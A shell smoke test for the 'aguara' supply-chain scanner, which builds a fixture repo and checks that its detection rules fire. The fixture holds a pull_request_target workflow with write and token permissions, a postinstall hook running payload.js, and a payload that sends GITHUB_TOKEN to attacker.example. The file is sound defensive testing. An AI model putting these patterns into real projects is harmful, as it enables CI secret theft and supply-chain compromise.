#!/bin/sh
#
# Behavioral smoke test for the chain analyzers landed in PRs #70-#75.
# Builds a fixture repo with a pwn-request workflow, a lifecycle-git
# package.json, and a JS payload that reads CI secrets and exfils, then
# runs `aguara scan --format json` and asserts the rules that must
# fire. The optional rules listed in the spec (GHA_CHECKOUT_001,
# NPM_OPTIONAL_GIT_001) are not asserted because the scanner's
# default dedup can suppress them when a stronger finding lands on the
# same line; the same suppression is documented behavior.
set -eu

OUT="${BENCH_OUT:-/out}"
# Pre-create Go's cache and temp dirs. The bench image sets
# GOCACHE=/tmp/go-build and GOTMPDIR=/tmp/go-tmp, and the container
# runs with --read-only + a fresh /tmp tmpfs, so the `go build` below
# fails without these directories. Matches the prelude in run.sh and
# race.sh so all three entrypoints share the same shape.
mkdir -p /tmp/go-build /tmp/go-tmp "$OUT"
FIX="/tmp/smoke-supply-chain"
rm -rf "$FIX"
mkdir -p "$FIX/.github/workflows"

# Build the binary with real ldflags so output is consistent with the
# bench provenance record.
PKG="github.com/garagon/aguara/cmd/aguara/commands"
LDFLAGS="-s -w -X ${PKG}.Version=${AGUARA_VERSION:-dev} -X ${PKG}.Commit=${AGUARA_COMMIT:-none}"
go build -trimpath -ldflags "$LDFLAGS" -o /tmp/aguara ./cmd/aguara

fail() {
  echo "SMOKE FAIL: $1" >&2
  exit 1
}

ok() {
  printf 'SMOKE OK  : %s\n' "$1"
}

# --- workflow: pull_request_target + write perms + cache + install ---
cat > "$FIX/.github/workflows/pwn.yml" <<'YAML'
name: Bundle Size
on: pull_request_target
permissions:
  contents: write
  id-token: write
jobs:
  size:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - uses: actions/setup-node@v4
        with:
          node-version: '20'
          cache: 'pnpm'
      - uses: actions/cache@v4
        with:
          path: ~/.cache
          key: pr-${{ github.event.pull_request.number }}
      - run: pnpm install
      - run: pnpm build
YAML

# --- package.json: lifecycle + git source dep ---
cat > "$FIX/package.json" <<'JSON'
{
  "name": "fixture",
  "version": "1.0.0",
  "scripts": {
    "postinstall": "node ./payload.js",
    "build": "tsc"
  },
  "optionalDependencies": {
    "setup": "github:owner/setup"
  }
}
JSON

# --- payload: reads CI secret + exfils ---
cat > "$FIX/payload.js" <<'JS'
const tok = process.env.GITHUB_TOKEN;
fetch('https://attacker.example/exfil', {method:'POST', body: tok});
JS

scan_json="$OUT/smoke-supply-chain.json"
/tmp/aguara --no-update-check scan --format json -o "$scan_json" "$FIX"

# Required rule IDs. The dedup pass can suppress same-line cross-rule
# duplicates, but each of these owns a distinct enough chain that at
# least one finding per rule should land somewhere in the scan.
must_fire="GHA_PWN_REQUEST_001 GHA_CACHE_001 GHA_OIDC_001 NPM_LIFECYCLE_GIT_001 JS_CI_SECRET_HARVEST_001"

for rule in $must_fire; do
  if ! grep -Eq "\"rule_id\":[[:space:]]*\"${rule}\"" "$scan_json"; then
    cat "$scan_json"
    fail "expected rule $rule did not fire on the supply-chain fixture"
  fi
  ok "$rule fired"
done

# Sanity: a clean fixture (just a README) should not chain any of the
# above rules.
clean="/tmp/smoke-supply-chain-clean"
rm -rf "$clean"
mkdir -p "$clean"
printf '# hello\n' > "$clean/README.md"

clean_json="$OUT/smoke-supply-chain-clean.json"
/tmp/aguara --no-update-check scan --format json -o "$clean_json" "$clean"
for rule in $must_fire; do
  if grep -Eq "\"rule_id\":[[:space:]]*\"${rule}\"" "$clean_json"; then
    cat "$clean_json"
    fail "rule $rule false-positive on the clean fixture"
  fi
done
ok "clean fixture chained none of the required rules"

echo
echo "all supply-chain smokes passed"
